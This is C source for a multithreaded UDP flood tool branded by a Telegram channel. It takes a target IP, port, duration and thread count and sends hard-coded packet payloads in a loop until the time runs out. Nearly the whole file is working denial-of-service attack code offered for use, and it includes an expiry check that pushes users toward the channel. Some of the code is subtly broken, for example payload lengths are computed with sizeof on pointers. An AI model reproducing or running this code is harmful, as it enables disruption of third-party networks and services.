#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")
#define CLOSESOCKET closesocket
#define THREAD_RETURN DWORD WINAPI
#else
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#define CLOSESOCKET close
#define THREAD_RETURN void *
#endif

void usage() {
    printf("Usage: ./soulcracks ip port time threads\n");
    exit(1);
}

void check_expiry() {

    int expiry_year = 2025;
    int expiry_month = 12;
    int expiry_day = 2;

    time_t now = time(NULL);
    struct tm expiry_date = {0};

    expiry_date.tm_year = expiry_year - 1900;
    expiry_date.tm_mon = expiry_month - 1;
    expiry_date.tm_mday = expiry_day;

    time_t expiry_time = mktime(&expiry_date);

    if (difftime(expiry_time, now) < 0) {
        printf("\nThis CODE HAS EXPIRED.\n");
        printf("CODE MADE BY @SOULCRACKS TELEGRAM CHANNEL\n");
        printf("FOR NEW UPDATES, JOIN @SOULCRACKS\n");
        exit(1);
    }
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

THREAD_RETURN attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[] = {
        "\xd9\x00", "\x00\x00", "\x72\xfe\x1d\x13\x00\x00",
        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00",
        "\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00"
    };

#ifdef _WIN32
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == INVALID_SOCKET) {
        fprintf(stderr, "Socket creation failed: %d\n", WSAGetLastError());
        pthread_exit(NULL);
    }
#else
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }
#endif

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], sizeof(payloads[i]), 0, 
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
#ifdef _WIN32
                fprintf(stderr, "Send failed: %d\n", WSAGetLastError());
#else
                perror("Send failed");
#endif
                CLOSESOCKET(sock);
                pthread_exit(NULL);
            }
        }
    }

    CLOSESOCKET(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    check_expiry();

    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);

#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "Failed to initialize Winsock.\n");
        exit(1);
    }
#endif

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));

    printf("MADE BY @SOULCRACKS TELEGRAM CHANNEL ATTACK STARTED on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        struct thread_data *data = malloc(sizeof(struct thread_data));
        data->ip = ip;
        data->port = port;
        data->time = time;

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
            perror("Thread creation failed");
            free(data);
            free(thread_ids);
#ifdef _WIN32
            WSACleanup();
#endif
            exit(1);
        }
        printf("Launched thread with ID: %lu\n", (unsigned long)thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);

#ifdef _WIN32
    WSACleanup();
#endif

    printf("Attack finished\n");
    return 0;
}